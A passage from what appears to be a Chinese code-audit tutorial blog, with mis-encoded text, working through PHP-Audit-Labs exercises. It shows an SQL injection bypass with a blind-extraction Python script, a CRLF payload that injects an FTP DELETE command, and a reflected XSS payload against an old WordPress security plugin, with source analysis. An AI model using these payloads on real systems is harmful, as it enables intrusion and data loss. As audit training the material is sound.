class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ä¸»è¦è¿˜æ˜¯ç»•è¿‡é˜²æŠ¤æˆåŠŸè¿›è¡Œsqlæ³¨å…¥,æˆ‘ä»¬å¯ä»¥çœ‹åˆ° ç¬¬25-26è¡Œ ï¼Œåªè¦æˆ‘ä»¬çŸ¥é“ Admin ç”¨æˆ·çš„å¯†ç ï¼Œå°±èƒ½æ‹¿åˆ°flagã€‚åœ¨ ç¬¬11è¡Œ å¤„ $_GET[user] å’Œ $_GET[pwd] ä¸¤ä¸ªå˜é‡å¯æ§ï¼Œå­˜åœ¨SQLæ³¨å…¥ã€‚å†çœ‹ ç¬¬6-7è¡Œ ï¼Œå½“ä¸­è¿‡æ»¤äº† # ã€ - å·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ— æ³•è¿›è¡Œå¸¸è§„çš„æ³¨é‡Šï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨ ;%00 æ¥è¿›è¡Œæ³¨é‡Šã€‚ $black_list è¿˜è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ä¸²æˆªå–å‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä½¿ç”¨ regexp æ¥è§£å†³ã€‚æœ€ç»ˆæˆ‘ä»¬çš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/CTF/?user=\&amp;pwd=||1;%00</span><br><span class="line">å¯¹åº”SQLè¯­å¥ä¸ºï¼š</span><br><span class="line">select user from users where user=&#x27;\&#x27; and pwd=&#x27;||1;&#x27;</span><br><span class="line">ç­‰ä»·äºï¼š</span><br><span class="line">select user from users where user=&#x27;xxxxxxxxxxx&#x27;||1#</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">char_set = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz_&#x27;</span></span><br><span class="line">pw = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> char_set:</span><br><span class="line">        url = <span class="string">&#x27;http://localhost/CTF/?user=\\&amp;pwd=||pwd/**/regexp/**/&quot;^%s&quot;;%%00&#x27;</span></span><br><span class="line">        r = requests.get(url=url%(pw+ch))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Welcome Admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            pw += ch</span><br><span class="line">            <span class="built_in">print</span>(pw)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> ch == <span class="string">&#x27;_&#x27;</span>: <span class="keyword">break</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://localhost/CTF/?user=&amp;pwd=%s&#x27;</span> % pw)</span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">&#x27;HRCTF&#123;\S&#123;1,50&#125;&#125;&#x27;</span>,r.text)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>REGEXP æ˜¯MySQLä¸­çš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ“ä½œç¬¦ï¼Œå®ƒæ£€æŸ¥pwdå­—æ®µæ˜¯å¦åŒ¹é…æŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼ã€‚<br>å¦‚æœpwdå­—æ®µä»¥çŒœæµ‹çš„å¯†ç å­—ç¬¦å¼€å¤´ï¼Œé‚£ä¹ˆæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æˆåŠŸï¼ŒSQLæŸ¥è¯¢å°†è¿”å›ç»“æœã€‚<br>ç”±äºè¿™æ˜¯ä¸€ä¸ªå¸ƒå°”ç›²æ³¨æ”»å‡»ï¼Œæ”»å‡»è€…æ— æ³•ç›´æ¥çœ‹åˆ°æŸ¥è¯¢ç»“æœï¼Œè€Œæ˜¯é€šè¿‡æœåŠ¡å™¨çš„å“åº”æ¥åˆ¤æ–­æ­£åˆ™è¡¨è¾¾å¼æ˜¯å¦åŒ¹é…æˆåŠŸã€‚</p><p><a href="https://www.leavesongs.com/penetration/360webscan-bypass.html">360webscané˜²æ³¨å…¥è„šæœ¬å…¨é¢ç»•è¿‡</a> </p><h2 id="Day-16-Poem"><a href="#Day-16-Poem" class="headerlink" title="Day 16 - Poem"></a>Day 16 - Poem</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTP</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sock</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sock = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="variable">$port</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$user</span>, <span class="variable">$pass</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanInput</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">mode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;mode&#x27;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">send</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanInput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$_GET</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;intval&#x27;</span>, <span class="variable">$_GET</span>);</span><br><span class="line">        <span class="variable">$_POST</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;intval&#x27;</span>, <span class="variable">$_POST</span>);</span><br><span class="line">        <span class="variable">$_COOKIE</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;intval&#x27;</span>, <span class="variable">$_COOKIE</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;sock, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;sock, <span class="variable">$username</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;sock, <span class="variable">$password</span> .<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mode</span>(<span class="params"><span class="variable">$mode</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$mode</span> == <span class="number">1</span> || <span class="variable">$mode</span> == <span class="number">2</span> || <span class="variable">$mode</span> == <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;sock, <span class="string">&quot;MODE<span class="subst">$mode</span>\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;sock, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FTP</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">21</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>æ¼æ´è§£æ</strong> ï¼š</p><p>è¿™é“é¢˜ç›®åŒ…å«äº†ä¸¤ä¸ªæ¼æ´ï¼Œåˆ©ç”¨è¿™ä¸¤ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å¾€FTPè¿æ¥èµ„æºä¸­æ³¨å…¥æ¶æ„æ•°æ®ï¼Œæ‰§è¡ŒFTPå‘½ä»¤ã€‚é¦–å…ˆçœ‹åˆ° <strong>ç¬¬7è¡Œ</strong> ä»£ç ï¼Œå¯ä»¥å‘ç°ç¨‹åºä½¿ç”¨ <strong>cleanInput</strong> æ–¹æ³•è¿‡æ»¤ <strong>GET</strong> ã€ <strong>POST</strong> ã€ <strong>COOKIE</strong> æ•°æ®ï¼Œå°†ä»–ä»¬å¼ºåˆ¶è½¬æˆæ•´å‹æ•°æ®ã€‚ç„¶è€Œåœ¨ <strong>ç¬¬8è¡Œ</strong> å¤„ï¼Œå´ä¼ å…¥äº†ä¸€ä¸ªä» <strong>REQUEST</strong> æ–¹å¼è·å–çš„ <strong>mode</strong> å˜é‡ã€‚æˆ‘ä»¬éƒ½çŸ¥é“è¶…å…¨å±€æ•°ç»„ <strong>$_REQUEST</strong> ä¸­çš„æ•°æ®ï¼Œæ˜¯ <strong>$_GET</strong> ã€ <strong>$_POST</strong> ã€ <strong>$_COOKIE</strong> çš„åˆé›†ï¼Œè€Œä¸”æ•°æ®æ˜¯å¤åˆ¶è¿‡å»çš„ï¼Œå¹¶ä¸æ˜¯å¼•ç”¨ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼Œæ¥éªŒè¯è¿™ä¸€è§‚ç‚¹ï¼š</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-3.png"></p><p>å¯ä»¥å‘ç° <strong>REQUEST</strong> æ•°æ®ä¸æ¯«ä¸å—è¿‡æ»¤å‡½æ•°çš„å½±å“ã€‚å›åˆ°æœ¬ä¾‹é¢˜ï¼Œä¾‹é¢˜ä¸­çš„ç¨‹åºè¿‡æ»¤å‡½æ•°åªå¯¹ <strong>GET</strong> ã€ <strong>POST</strong> ã€ <strong>COOKIE</strong> æ•°æ®è¿›è¡Œæ“ä½œï¼Œæœ€åæ‹¿æ¥ç”¨çš„å´æ˜¯ <strong>REQUEST</strong> æ•°æ®ï¼Œè¿™æ˜¾ç„¶ä¼šå­˜åœ¨å®‰å…¨éšæ‚£ã€‚æƒ³äº†è§£æ›´å¤š <a href="http://www.php.net/manual/zh/reserved.variables.request.php"><strong>$_REQUEST</strong></a> ä¿¡æ¯ï¼Œå¤§å®¶è‡ªå·±ä¸Šå®˜ç½‘å­¦ä¹ ã€‚ç¬¬äºŒä¸ªæ¼æ´çš„è¯ï¼Œåœ¨ä»£ç  <strong>ç¬¬21è¡Œ</strong> ï¼Œè¿™é‡Œç”¨äº† <strong>&#x3D;&#x3D;</strong> å¼±æ¯”è¾ƒã€‚å…³äºè¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬åœ¨å‰é¢çš„æ–‡ç« ä¸­è®²çš„ä¹Ÿå¾ˆç»†è‡´äº†ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2491#toc-4">[çº¢æ—¥å®‰å…¨]PHP-Audit-Labsé¢˜è§£ä¹‹Day1-4</a> ï¼ˆDay4ï¼‰ã€‚</p><p>è‡³äºæœ¬æ¬¡æ¡ˆä¾‹çš„æ”»å‡»payloadï¼Œå¯ä»¥ä½¿ç”¨ï¼š <strong>?mode&#x3D;1%0a%0dDELETE%20test.file</strong> ï¼Œè¿™ä¸ªå³å¯è¾¾åˆ°åˆ é™¤FTPæœåŠ¡å™¨æ–‡ä»¶çš„æ•ˆæœã€‚</p><h3 id="å®ä¾‹åˆ†æ-1"><a href="#å®ä¾‹åˆ†æ-1" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>æœ¬æ¬¡å®ä¾‹åˆ†æï¼Œæˆ‘ä»¬åˆ†æçš„æ˜¯ <strong>WordPress</strong> çš„ <a href="https://cn.wordpress.org/plugins/all-in-one-wp-security-and-firewall/">All In One WP Security &amp; Firewall</a> æ’ä»¶ã€‚è¯¥æ’ä»¶åœ¨ <strong>4.1.4 - 4.1.9</strong> ç‰ˆæœ¬ä¸­å­˜åœ¨åå°„å‹XSSæ¼æ´ï¼Œæ¼æ´åŸå› å’Œæœ¬æ¬¡æ¡ˆä¾‹ä¸­çš„æ¼æ´æˆå› ä¸€è‡´ï¼Œå®˜æ–¹ä¹Ÿåœ¨ <strong>4.2.0</strong> ç‰ˆæœ¬ä¸­ä¿®å¤äº†è¯¥æ¼æ´ã€‚æœ¬æ¬¡ï¼Œæˆ‘ä»¬å°†ä»¥ <strong>4.1.4</strong> ç‰ˆæœ¬æ’ä»¶ä½œä¸ºæ¡ˆä¾‹è®²è§£ã€‚<br>å°†ä¸‹è½½ä¸‹æ¥çš„æ’ä»¶zipåŒ…ï¼Œé€šè¿‡åå°æ’ä»¶ç®¡ç†ä¸Šä¼ å‹ç¼©åŒ…å®‰è£…å³å¯ã€‚æœ¬æ¬¡å‘ç”Ÿé—®é¢˜çš„æ–‡ä»¶åœ¨äº <strong>wp-content\plugins\all-in-one-wp-security-and-firewall\admin\wp-security-dashboard-menu.php</strong> ï¼Œä¸ºäº†æ–¹ä¾¿å¤§å®¶ç†è§£ï¼Œæˆ‘å°†é—®é¢˜ä»£ç æŠ½å–å‡ºæ¥ï¼Œç®€åŒ–å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AIOWPSecurity_Dashboard_Menu</span> <span class="keyword">extends</span> <span class="title">AIOWPSecurity_Admin_Menu</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$menu_tabs_handler</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;tab1&#x27;</span> =&gt; <span class="string">&#x27;render_tab1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tab2&#x27;</span> =&gt; <span class="string">&#x27;render_tab2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tab3&#x27;</span> =&gt; <span class="string">&#x27;render_tab3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tab4&#x27;</span> =&gt; <span class="string">&#x27;render_tab4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tab5&#x27;</span> =&gt; <span class="string">&#x27;render_tab5&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">render_menu_page</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">render_menu_page</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set_menu_tabs</span>();</span><br><span class="line">        <span class="variable">$tab</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_current_tab</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">render_menu_tabs</span>();</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(&amp;<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;menu_tabs_handler[<span class="variable">$tab</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">render_tab3</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;tab&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;tab&quot; value=&quot;&#x27;</span> . <span class="variable">$_REQUEST</span>[<span class="string">&quot;tab&quot;</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°ï¼Œé—®é¢˜å°±å‡ºåœ¨ <strong>ç¬¬25è¡Œ</strong> çš„ <strong>render_tab3</strong> æ–¹æ³•ä¸­ï¼Œè¿™é‡Œç›´æ¥å°† <strong>REQUEST</strong> æ–¹å¼è·å–çš„ <strong>tab</strong> å˜é‡æ‹¼æ¥å¹¶è¾“å‡ºã€‚è€Œå®é™…ä¸Šï¼Œåœ¨ <strong>ç¬¬20è¡Œ</strong> å·²ç»è·å–äº†ç»è¿‡è¿‡æ»¤å¤„ç†çš„ <strong>$tab</strong> å˜é‡ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ <strong>get_current_tab</strong> æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_current_tab</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$tab_keys</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;menu_tabs);</span><br><span class="line">    <span class="variable">$tab</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tab&#x27;</span>]) ? <span class="title function_ invoke__">sanitize_text_field</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tab&#x27;</span>]) : <span class="variable">$tab_keys</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$tab</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤å‡½æ•°çš„è°ƒç”¨é“¾å¦‚ä¸‹å›¾ <strong>ç¬¬1è¡Œ</strong> ï¼Œæ¥ç€ <strong>$tab</strong> å˜é‡å°±ä¼šç»è¿‡ <strong>wp_check_invalid_utf8</strong> æ–¹æ³•çš„æ£€æµ‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_check_invalid_utf8</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$strip</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = (<span class="keyword">string</span>)<span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> === <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Store the site charset as a static to avoid multiple calls to get_option()</span></span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$is_utf8</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$is_utf8</span>)) &#123;</span><br><span class="line">        <span class="variable">$is_utf8</span> = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">get_option</span>(<span class="string">&#x27;blog_charset&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;utf8&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;UTF8&#x27;</span>, <span class="string">&#x27;UTF-8&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$is_utf8</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for support for utf8 in the installed PCRE library once and store the result in a static</span></span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$utf8_pcre</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$utf8_pcre</span>)) &#123;</span><br><span class="line">        <span class="variable">$utf8_pcre</span> = @<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^./u&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// We can&#x27;t demand utf8 in the PCRE installation, so just return the string in those cases</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$utf8_pcre</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// preg_match fails when it encounters invalid UTF8 in $string</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> === @<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^./us&#x27;</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Attempt to strip the bad chars if requested(not recommended)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$strip</span> &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;iconv&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹æ”»å‡» <strong>payload</strong> ï¼ˆå‘ <a href="http://website/wp-admin/admin.php?page=aiowpsec&tab=tab3">http://website/wp-admin/admin.php?page=aiowpsec&amp;tab=tab3</a> POSTæ•°æ® <code>tab=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> ï¼‰ï¼š</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-4.png"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸå¼•å‘XSSæ”»å‡»ã€‚æˆ‘ä»¬æœ€åå†æ ¹æ® <strong>payload</strong> å¯¹ä»£ç çš„è°ƒç”¨è¿‡ç¨‹è¿›è¡Œåˆ†æã€‚é¦–å…ˆï¼Œæˆ‘ä»¬çš„ <strong>payload</strong> ä¼šä¼ å…¥ <strong>wp-admin&#x2F;admin.php</strong> æ–‡ä»¶ä¸­ï¼Œæœ€åè¿›å…¥ <strong>ç¬¬14è¡Œ</strong> çš„ <strong>do_action(â€˜toplevel_page_aiowpsecâ€™);</strong> ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/admin.php</span></span><br><span class="line"><span class="variable">$page_hook</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$plugin_page</span> = <span class="title function_ invoke__">wp_unslash</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">    <span class="variable">$plugin_page</span> = <span class="title function_ invoke__">plugin_basename</span>(<span class="variable">$plugin_page</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡get_plugin_page_hookå‡½æ•°å¤„ç†ï¼Œ$page_hook=&#x27;toplevel_page_aiowpsec&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$plugin_page</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$page_hook</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">do_action</span>(<span class="variable">$page_hook</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ <strong>wp-includes&#x2F;plugin.php</strong> æ–‡ä»¶ä¸­ï¼Œç¨‹åºåˆè°ƒç”¨äº† <strong>WP_Hook</strong> ç±»çš„ <strong>do_action</strong> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è°ƒç”¨äº†è‡ªèº«çš„ <strong>apply_filters</strong> æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/plugin.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_action</span>(<span class="params"><span class="variable">$tag</span>, <span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$wp_filter</span>, <span class="variable">$wp_actions</span>, <span class="variable">$wp_current_filter</span>;</span><br><span class="line"></span><br><span class="line">    <span 